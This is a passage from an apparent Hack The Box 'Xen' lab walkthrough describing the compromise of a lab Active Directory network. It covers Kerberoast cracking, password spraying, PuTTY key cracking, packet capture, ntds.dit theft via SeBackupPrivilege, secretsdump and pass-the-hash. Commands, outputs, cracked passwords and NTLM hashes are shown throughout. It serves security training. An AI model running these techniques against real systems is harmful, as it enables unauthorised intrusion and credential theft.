37f17c6c671e9a97d4559a1a432aeea2275d7ea803e255add1daae32105c0337da391486157adb645d2faf0a138f63b0a1d7d739d11cbb53013ababb1cbf8d11c71bc143abf200466288197a6714d76ca0e538c25c8563e00acaa020033e3800d0c46cffc164a7a7bdc7851edcc08971328a59f3830158b9146027ccbe4d41df15f5834eff7dded87c4fd40b9aaf287a0d1a8c06cf71c82981ae6832a04ec30499570fb5842416a3202521095d9f337d7bfb1805ba18b7bd50396:4install!                                                                               
    
    Session..........: hashcat
    Status...........: Cracked
    Hash.Type........: Kerberos 5 TGS-REP etype 23
    Hash.Target......: $krb5tgs$23$*mturner$HTB.LOCAL$MSSQLSvc/CITRIXTEST....d50396
    Time.Started.....: Mon May 13 17:40:49 2019 (6 hours, 49 mins)
    Time.Estimated...: Tue May 14 00:30:34 2019 (0 secs)
    Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
    Guess.Mod........: Rules (/usr/share/hashcat/rules/dive.rule)
    Guess.Queue......: 1/1 (100.00%)
    Speed.#1.........:   348.1 kH/s (14.54ms) @ Accel:8 Loops:4 Thr:64 Vec:8
    Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts
    Progress.........: 8733004800/1421327732110 (0.61%)
    Rejected.........: 0/8733004800 (0.00%)
    Restore.Point....: 87552/14344385 (0.61%)
    Restore.Sub.#1...: Salt:0 Amplifier:37644-37648 Iteration:0-4
    Candidates.#1....: temperaas1ture -> hako03
    
    Started: Mon May 13 17:40:36 2019
    Stopped: Tue May 14 00:30:36 2019
    

New creds: mturner / 4install!

### Network Enumeration

I wanted to get a list of IPs of hosts in the network, so I’ll use
`PowerView.ps1` from PowerSploit.

    
    
    meterpreter > use powershell 
    Loading extension powershell...Success.
    meterpreter > powershell_import /opt/PowerSploit/Recon/PowerView.ps1
    [+] File successfully imported. No result was returned.
    

Now drop into PowerShell and get computer list:

    
    
    meterpreter > powershell_shell 
    PS > Get-DomainComputer | select name
    
    name
    ----
    DC
    CITRIX
    VDESKTOP3
    VDESKTOP2
    VDESKTOP1
    LAPTOP1
    LAPTOP2
    LAPTOP3
    LAPTOP5
    LAPTOP6
    WK01
    WK02
    WK03
    WK04
    WK05
    WK06
    WK07
    WK09
    

Taking that list, combining it with the list of hosts from the [Xen
Page](https://www.hackthebox.eu/home/endgame/view/2), and some `ping`, I
believe the active network looks like:

Hostname | IP  
---|---  
DC | .200  
CITRIX | .201  
NETSCALER | .202  
VDESKTOP1 | .203  
VDESKTOP2 | .204  
VDESKTOP3 | .205  
  
The NETSCALER IP is a bit of a guess, but it’s ping returns a TTL of 64, which
matches FreeBSD.

### SMB Access on CITRIX

As I’m already SYSTEM on the three VDESKTOP machines, I start poking at
CITRIX. The creds from Kerberoast are good, but not enough to give a shell:

    
    
    root@kali# proxychains crackmapexec smb 172.16.249.201 -u mturner -p '4install!'
    ProxyChains-3.1 (http://proxychains.sf.net)
    SMB         172.16.249.201  445    CITRIX           [*] Windows Server 2008 R2 Standard 7601 Service Pack 1 (name:CITRIX) (domain:htb.local) (signing:False) (SMBv1:True)
    SMB         172.16.249.201  445    CITRIX           [+] htb.local\mturner:4install!
    

I’ll list the shares on the host:

    
    
    C:\>net view /all \\citrix
    Shared resources at \\citrix
    
    Share name  Type  Used as  Comment        
    
    -------------------------------------------------------------------------------
    ADMIN$      Disk           Remote Admin   
    C$          Disk           Default share  
    Citrix$     Disk                          
    IPC$        IPC            Remote IPC     
    ISOs        Disk                          
    ISOs-TEST   Disk                          
    The command completed successfully.
    

In the `Citrix$` share, I find a flag:

    
    
    C:\>net use \\citrix\citrix$ /u:mturner 4install!
    The command completed successfully.
    
    
    C:\>dir \\citrix\citrix$
     Volume in drive \\citrix\citrix$ has no label.
     Volume Serial Number is 244B-E63F
    
     Directory of \\citrix\citrix$
    
    05/08/2019  06:12 PM    <DIR>          .
    05/08/2019  06:12 PM    <DIR>          ..
    02/12/2019  07:21 PM           997,001 Deploying-XenServer-5.6.pdf
    03/31/2019  11:25 AM                20 flag.txt
    05/08/2019  06:21 PM             1,486 private.ppk
    02/12/2019  07:21 PM         1,747,587 XenServer-5-6-SHG.pdf
                   4 File(s)      2,746,094 bytes
                   2 Dir(s)  25,994,129,408 bytes free
                   
    C:\>type \\citrix\citrix$\flag.txt
    XEN{l364cy_5pn5_ftw}
    

**Ghost: XEN{l364cy_5pn5_ftw}**

## Camouflage

### Enumeration

Also in the SMB share I find some PDFs about XenServer (which is the Citrix
Hypervisor) and a `private.ppk`, which is an SSH key used by Windows programs
like Putty. This all seems like a hint to turn towards the Citrix device,
NETSCALER.

#### Web

If I tell Firefox to use the local SOCKS4 proxy on TCP 1080 (can do it in the
settings, but I like FoxyProxy plugin), then I can browse to the NetScaler
webpage:

![image-20200617073132095](https://0xdfimages.gitlab.io/img/image-20200617073132095.png)

I can also log in with the creds I got from phishing:

![image-20200617072740621](https://0xdfimages.gitlab.io/img/image-20200617072740621.png)

I spent a few minutes looking for exploits to get a shell from web access, but
then decided that because I had this SSH key, I should start there.

#### SSH

The creds from phishing and from mturner all work to log in with SSH:

    
    
    root@kali# proxychains sshpass -p '4install!' ssh mturner@172.16.249.202
    ProxyChains-3.1 (http://proxychains.sf.net)
    ###############################################################################
    #                                                                             #
    #        WARNING: Access to this system is for authorized users only          #
    #         Disconnect IMMEDIATELY if you are not an authorized user!           #
    #                                                                             #
    ###############################################################################
    
    Last login: Mon Jun 15 12:17:27 2020 from 172.16.249.203
     Done
    mturner@???-12:35>
    

Unfortunately for me, they drop me at a Citrix terminal:

    
    
    mturner@???-12:35> ls
    ERROR: No such command
    mturner@???-12:35> help
    
       NetScaler command-line interface
     
       Try :
         'help <commandName>' for full usage of a specific command
         'help <groupName>'   for brief usage of a group of commands
         'help -all'          for brief usage of all CLI commands
         'man <commandName>'  for a complete command description
     
         '?' will show possible completions in the current context
     
      The command groups are:
            basic                   app                     aaa                     appflow                 appfw                   appqoe                  audit                   authentication          authorization  
            autoscale               bfd                     ca                      cache                   cli                     cloud                   cluster                 cmp                     feo            
            cr                      cs                      db                      dns                     dos                     event                   filter                  gslb                    HA             
            ica                     ipsec                   ipsecalg                lb                      lsn                     network                 ns                      ntp                     policy         
            pq                      protocol                qos                     rdp                     responder               rewrite                 rise                    router                  snmp           
            spillover               sc                      ssl                     stream                  system                  subscriber              tm                      transform               tunnel         
            utility                 vpn                     wi                      wf                      smpp                    lldp                    mediaclassifica         ulfd                    reputation     
            pcp                     urlfiltering            videooptimizati         adaptivetcp             user            
     Done
    

I spent some time looking through the commands and trying to see if there was
useful information, but nothing came up. The
[documentation](https://developer-docs.citrix.com/projects/netscaler-command-
reference/en/12.0/utility/shell/shell/) does show a `shell` command, but this
user doesn’t have privilege to run it:

    
    
    > shell
    ERROR: Not authorized to execute this command [shell]
    

### SSH Key

#### Need Passphrase

The key from the share is just a text file, so I’ll `type` it from Windows and
then create the same file locally. To work with a `.ppk`, I’ll install
`puttygen` with `apt install putty-tools`. I can try to reformat it as a
standard Linux SSH key, but it needs a password:

    
    
    root@kali# puttygen private.ppk -O private-openssh -o private.pem 
    Enter passphrase to load key: 
    puttygen: error loading `private.ppk': wrong passphrase
    

I’ll format the key into a hash that `john` can process with `putty2john`:

    
    
    root@kali# putty2john private.ppk > private.ppk.john
    

#### kwprocessor

I tried several wordlists, but without much luck. `rockyou` didn’t do it, even
with rules. Eventually I found
[kwprocessor](https://github.com/hashcat/kwprocessor) from the Hashcat team.
It generates wordlists of keyboard walks.

I’ll clone it locally and use it to make a wordlist:

    
    
    root@kali:/opt/kwprocessor# ./kwp basechars/full.base keymaps/en-us.keymap routes/2-to-16-max-3-direction-changes.route > ~/hackthebox/endgame-xen-10.13.38.12/keyboard_walks-2-to-16-3-direction
    

This generates over 65-thousand passwords:

    
    
    root@kali# wc -l keyboard_walks-2-to-16-3-direction 
    65758 keyboard_walks-2-to-16-3-direction
    

I’ll pass it to `john`, and it breaks the key:

    
    
    root@kali# john private.ppk.john -wordlist=keyboard_walks-2-to-26-3-direction 
    Using default input encoding: UTF-8
    Loaded 1 password hash (PuTTY, Private Key (RSA/DSA/ECDSA/ED25519) [SHA1/AES 32/64])
    Will run 3 OpenMP threads
    Press 'q' or Ctrl-C to abort, almost any other key for status
    =-09876567890-=- (private)
    1g 0:00:00:00 DONE (2019-05-14 16:48) 4.000g/s 248832p/s 248832c/s 248832C/s 123456787654321q..23456789876543212
    Use the "--show" option to display all of the cracked passwords reliably
    Session completed
    

Now `puttygen` will create SSH keys:

    
    
    root@kali# puttygen private.ppk -O private-openssh -o private.pem -P
    Enter passphrase to load key: 
    Enter passphrase to save key: 
    Re-enter passphrase to verify: 
    

I’ll give it a blank password, which saves it unencrypted.

I’ll also make sure to change the permissions to 600 with `chmod 600
private.pem`.

### Shell

Now I can SSH to .202. I tried SSH as the users I had, and as root, but it
fails with each of those:

    
    
    root@kali# proxychains ssh -i ~/id_private_xen.pem root@172.16.249.202
    ProxyChains-3.1 (http://proxychains.sf.net)
    ###############################################################################
    #                                                                             #
    #        WARNING: Access to this system is for authorized users only          #
    #         Disconnect IMMEDIATELY if you are not an authorized user!           #
    #                                                                             #
    ###############################################################################
    
    Password:
    

Some Googling led me to [some documentation on
NetScaler](https://docs.citrix.com/en-us/citrix-hardware-
platforms/sdx/initial-configuration.html), and I noticed that it was always
using the user nsroot. I tried that, and it worked:

    
    
    root@kali# proxychains ssh -i ~/id_private_xen.pem nsroot@172.16.249.202
    ProxyChains-3.1 (http://proxychains.sf.net)
    ###############################################################################
    #                                                                             #
    #        WARNING: Access to this system is for authorized users only          #
    #         Disconnect IMMEDIATELY if you are not an authorized user!           #
    #                                                                             #
    ###############################################################################
    
    Enter passphrase for key '/root/id_private_xen.pem':
    Last login: Wed May  8 23:23:15 2019 from 172.16.249.201
     Done
    > 
    

I’m still at this Netscaler prompt, but this user has access to the `shell`
[command](https://developer-docs.citrix.com/projects/netscaler-command-
reference/en/12.0/utility/shell/shell/):

    
    
    > shell
    Copyright (c) 1992-2013 The FreeBSD Project.
    Copyright (c) 1979, 1980, 1983, 1986, 1988, 1989, 1991, 1992, 1993, 1994
            The Regents of the University of California. All rights reserved.
    
    root@netscaler#
    

### Network Capture

After looking around the box and finding not much of interest, I decided to
see what kind of traffic might be flowing through the NetScaler device. I
started `tcpdump` to capture full packets and exclude SSH activity. I’ll run
it in the background, and watch the size, and once it gets big enough, kill
the process:

    
    
    root@netscaler# tcpdump -i 1 -w .d.pcap -s 0 'not tcp port 22' &
    [1] 8574
    tcpdump: listening on 0/1, link-type EN10MB (Ethernet), capture size 65535 bytes
    root@netscaler# ls -l .d.pcap
    -rw-r--r--  1 root  wheel  262144 May 17 06:04 .d.pcap
    root@netscaler# kill 8574
    root@netscaler# 2419 packets captured
    2544 packets received by filter
    0 packets dropped by kernel
    [1]+  Done                    tcpdump -i 1 -w .d.pcap -s 0 'not tcp port 22'
    

I used `scp` to get the capture back to my box:

    
    
    root@kali# proxychains scp -i ~/id_private_xen.pem nsroot@172.16.249.202:/tmp/.d/.d.pcap all.pcap                                                                                     
    ProxyChains-3.1 (http://proxychains.sf.net)
    ###############################################################################
    #                                                                             #
    #        WARNING: Access to this system is for authorized users only          #
    #         Disconnect IMMEDIATELY if you are not an authorized user!           #
    #                                                                             #
    ###############################################################################
    
    .d.pcap         100%  318KB 182.6KB/s   00:01
    

### PCAP Analysis

#### Summary

Opening the PCAP in Wireshark, I’ll take a look at the summary statistic
views. In addition to random high ports, there’s traffic on port 80 and 389.

![1558069873555](https://0xdfimages.gitlab.io/img/1558069873555.png)

The LDAP (389) traffic is between NetScaler and the DC, whereas the HTTP (80)
is between this device and CITRIX:

![1558069926418](https://0xdfimages.gitlab.io/img/1558069926418.png)

#### HTTP

The HTTP traffic contains a POST request which includes a flag:

![1558069999996](https://0xdfimages.gitlab.io/img/1558069999996.png)

**Camouflage: XEN{bu7_ld4p5_15_4_h455l3}**

#### LDAP

The LDAP streams are all the same. Each one includes the same flag:

![1558070119702](https://0xdfimages.gitlab.io/img/1558070119702.png)

I can also drill down and get the LDAP creds for the netscaler-svc account as
they are passed in plaintext:

![1558070147841](https://0xdfimages.gitlab.io/img/1558070147841.png)

## Doppelgänger

### Bloodhound

At this point I got a bit stuck and went back to basic enumeration. These
creds didn’t seem to be buying me much. I had actually collected
[Bloodhound](https://github.com/BloodHoundAD/BloodHound) data back when I
first got a foothold, but I hadn’t seen much in it. I did this by uploading
the `SharpHound.ps1` ingestor, and then running it:

![1558073852506](https://0xdfimages.gitlab.io/img/1558073852506.png)

On revisiting it now with the creds for netscaler-svc, I noticed there were a
lot of svc (service) accounts:

![1558074281344](https://0xdfimages.gitlab.io/img/1558074281344.png)

### Password Spray

Given the flag name of Doppelgänger, I did a password spray with this password
on all the accounts. Today I would use `crackmapexec` to do this:

    
    
    root@kali# proxychains crackmapexec smb 172.16.249.201 -u svc-accounts -p '#S3rvice#@cc' --continue-on-success
    ProxyChains-3.1 (http://proxychains.sf.net)
    SMB         172.16.249.201  445    CITRIX           [*] Windows Server 2008 R2 Standard 7601 Service Pack 1 (name:CITRIX) (domain:htb.local) (signing:False) (SMBv1:True)
    SMB         172.16.249.201  445    CITRIX           [-] htb.local\app-svc:#S3rvice#@cc STATUS_LOGON_FAILURE 
    SMB         172.16.249.201  445    CITRIX           [+] htb.local\backup-svc:#S3rvice#@cc 
    SMB         172.16.249.201  445    CITRIX           [-] htb.local\test-svc:#S3rvice#@cc STATUS_LOGON_FAILURE 
    SMB         172.16.249.201  445    CITRIX           [+] htb.local\netscaler-svc:#S3rvice#@cc 
    SMB         172.16.249.201  445    CITRIX           [+] htb.local\mssql-svc:#S3rvice#@cc 
    SMB         172.16.249.201  445    CITRIX           [+] htb.local\xenserver-svc:#S3rvice#@cc 
    SMB         172.16.249.201  445    CITRIX           [+] htb.local\print-svc:#S3rvice#@cc
    

When I originally solved the lab, I used a Bash loop over the accounts with
`smbclient`:

    
    
    root@kali# for svc in app-svc backup-svc test-svc netscaler-svc mssql-svc xenserver-svc print-svc; do proxychains smbclient -U htb.local\\netscaler-svc%#S3rvice#@cc -L //172.16.249.201/ 2>/dev/null > /dev/null && echo "${svc}:#S3rvice#@cc worked"; done
    app-svc:#S3rvice#@cc worked
    backup-svc:#S3rvice#@cc worked
    test-svc:#S3rvice#@cc worked
    mssql-svc:#S3rvice#@cc worked
    xenserver-svc:#S3rvice#@cc worked
    

Either way, it finds that five accounts use this weak service password.

### RDP / WinRM Access

The Bloodhound data shows that backup-svc has rdp access to dc.htb.local:

![1558074460641](https://0xdfimages.gitlab.io/img/1558074460641.png)

I can connect with `proxychains xfreerdp /u:backup-svc /p:#S3rvice#@cc
/v:172.16.249.200` and get a desktop, and the next flag:

![1558075265656](https://0xdfimages.gitlab.io/img/1558075265656.png)

Some quick enum shows that this account can also connect over winrm (today I
would use [Evil-WinRM](https://github.com/Hackplayers/evil-winrm), but back
then I used [Alamot’s Ruby WinRM script](https://github.com/Alamot/code-
snippets/blob/master/winrm/winrm_shell_with_upload.rb)):

    
    
    root@kali# proxychains ruby winrm_shell_with_upload.rb
    ProxyChains-3.1 (http://proxychains.sf.net)
    PS htb\backup-svc@DC Documents> cd ..\desktop
    PS htb\backup-svc@DC desktop> ls
    
        Directory: C:\Users\backup-svc\desktop
    
    Mode                LastWriteTime         Length Name
    ----                -------------         ------ ----
    -a----        3/31/2019  10:38 PM             27 flag.txt
    
    
    PS htb\backup-svc@DC desktop> cat flag.txt
    XEN{y_5h4r3d_p@55w0Rd5?} 
    

**Doppelgänger: XEN{y_5h4r3d_p@55w0Rd5?}**

## Owned

### Enumeration

With a shell on the domain controller, the obvious next step is to try to get
domain admin. My current access is through the svc-backup account:

    
    
    *Evil-WinRM* PS C:\Users\backup-svc\Documents> net user backup-svc
    User name                    backup-svc
    Full Name                    backup-svc
    Comment
    User's comment
    Country/region code          000 (System Default)
    Account active               Yes
    Account expires              Never
    
    Password last set            3/2/2019 10:46:38 PM
    Password expires             Never
    Password changeable          3/3/2019 10:46:38 PM
    Password required            Yes
    User may change password     Yes
    
    Workstations allowed         All
    Logon script
    User profile
    Home directory
    Last logon                   6/17/2020 8:17:12 PM
    
    Logon hours allowed          All
    
    Local Group Memberships      *Backup Operators     *Remote Desktop Users
                                 *Remote Management Use
    Global Group memberships     *Domain Users
    The command completed successfully.
    

The Backup Operators group is interesting for sure, as it [provides the
ability to read/write most files](https://www.backup4all.com/what-are-backup-
operators-kb.html) on the disk. This shows up in the form of
`SeBackupPrivilege` and `SeRestorePrivilege`:

    
    
    *Evil-WinRM* PS C:\Users\backup-svc\Documents> whoami /priv
    
    PRIVILEGES INFORMATION
    ----------------------
    
    Privilege Name                Description                    State
    ============================= ============================== =======
    SeMachineAccountPrivilege     Add workstations to domain     Enabled
    SeBackupPrivilege             Back up files and directories  Enabled
    SeRestorePrivilege            Restore files and directories  Enabled
    SeShutdownPrivilege           Shut down the system           Enabled
    SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
    SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
    

### Dump Hashes

#### Strategy

I want to get the `ntds.dit` file, which is the active directory database that
stores all the hashes for the domain users. Unfortunately, even with
`SeBackupPrivilege`, I can’t access `ntds.dit` on a live machine because it is
in use. I’ll use a Microsoft tool, `diskshadow` to mount a shadow copy of the
harddisk from which I can then copy the file. I’ll also need a tool that
allows me to take advantage of the `SeBackUpPrivilege`.

#### Mount Disk

I’ll RDP into the DC and use `diskshadow` to create a shadow and mount it as
`u:`:

![558111566616](https://0xdfimages.gitlab.io/img/1558111566616.png)

#### Backup Copy

[This tool](https://github.com/giuliano108/SeBackupPrivilege) will allow me to
use the `SeBackupPrivilege` to get to files that I otherwise can’t read. I’ll
upload the two `.dll` files to the DC using WinRM, and then import them into
PowerShell. Then I can use `Copy-FileSeBackupPrivilege
u:\Windows\ntds\ntds.dit [destination]`

#### Exfil

The DC can’t talk directly to my Kali box.

I probably could have just used the WinRM upload / download capability, but
for some reason I didn’t. Instead, I started a share on the workstation from
Citrix, .203:

    
    
    C:\programdata>net share df=c:\programdata /grant:everyone,FULL
    net share df=c:\programdata /grant:everyone,FULL
    df was shared successfully.
    

Then from the DC, I mounted that share:

    
    
    PS htb\backup-svc@DC Documents> PS htb\backup-svc@DC Documents> net use \\172.16.249.203\df /user:htb\mturner 4install!                                                                                                    
    The command completed successfully.
    

Then I could `proxychains` access that share from my host.

#### Putting It All Together

Now with all that prepped, I copied `ntds.dit` and the SYSTEM hive to my share
on .203, and then back to my host:

    
    
    PS htb\backup-svc@DC system32> Copy-FileSeBackupPrivilege u:\Windows\ntds\ntds.dit \\172.16.249.203\df\ntds.dit
    PS htb\backup-svc@DC system32> reg save hklm\system \\172.16.249.203\df\sys
    

I then used `diskshadow` to unmount the disk to cleanup.

#### Dump Hashes

With `ntds.dit` and `system`, I can use `sercretsdump.py` to get hashes:

    
    
    root@kali# secretsdump.py -system system -ntds ntds.dit LOCAL        
    Impacket v0.9.19-dev - Copyright 2018 SecureAuth Corporation                   
    
    [*] Target system bootKey: 0x6e398137ec7f2e204671dad7c778509f
    [*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
    [*] Searching for pekList, be patient
    [*] PEK # 0 found and decrypted: 4a62a0ac1475b54add921ac8c1b72e31
    [*] Reading and decrypting hashes from ntds.dit
    Administrator:500:aad3b435b51404eeaad3b435b51404ee:822601ccd7155f47cd955b94af1558be:::
    Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
    DC$:1000:aad3b435b51404eeaad3b435b51404ee:5e507509602e1b651759527b87b6c347:::
    krbtgt:502:aad3b435b51404eeaad3b435b51404ee:3791ca8d70c9e1d2d2c7c5b5c7c253e8:::
    CITRIX$:1103:aad3b435b51404eeaad3b435b51404ee:fd981d0c915932bb3ddf38b415c49121:::
    htb.local\alarsson:1104:aad3b435b51404eeaad3b435b51404ee:92a44f1aa6259c55f9f514fabae5cc3f:::   
    htb.local\jmendes:1106:aad3b435b51404eeaad3b435b51404ee:10d0c05f7d958955f0eaf1479b5124a0:::
    htb.local\pmorgan:1107:aad3b435b51404eeaad3b435b51404ee:8618ba932416a7404a854b250bf28577:::
    htb.local\awardel:1108:aad3b435b51404eeaad3b435b51404ee:270e4d446437f4383b092b42a9f88f0a:::
    VDESKTOP3$:1109:aad3b435b51404eeaad3b435b51404ee:e582f9b9d77dae6357bb574620b721ce:::
    VDESKTOP2$:1110:aad3b435b51404eeaad3b435b51404ee:f583f9b5fc860b9ae21e482caaad0553:::
    ...[snip]...
    

All I really need is the first one, Administrator.

### wmiexec

I used `wmiexec.py` to get a shell with the admin hash, and grab the last flag
(Evil-WinRM would work as well):

    
    
    root@kali# proxychains wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:822601ccd7155f47cd955b94af1558be administrator@172.16.249.200                                              
    ProxyChains-3.1 (http://proxychains.sf.net)
    Impacket v0.9.19-dev - Copyright 2018 SecureAuth Corporation
    
    [*] SMBv3.0 dialect used
    [!] Launching semi-interactive shell - Careful what you execute
    [!] Press help for extra shell commands
    C:\>whoami
    htb\administrator
    
    C:\>cd users\administrator\desktop
    C:\users\administrator\desktop>type flag.txt
    XEN{d3r1v471v3_d0m41n_4dm1n}
    

**Owned: XEN{d3r1v471v3_d0m41n_4dm1n}**

[](/2020/06/17/endgame-xen.html)

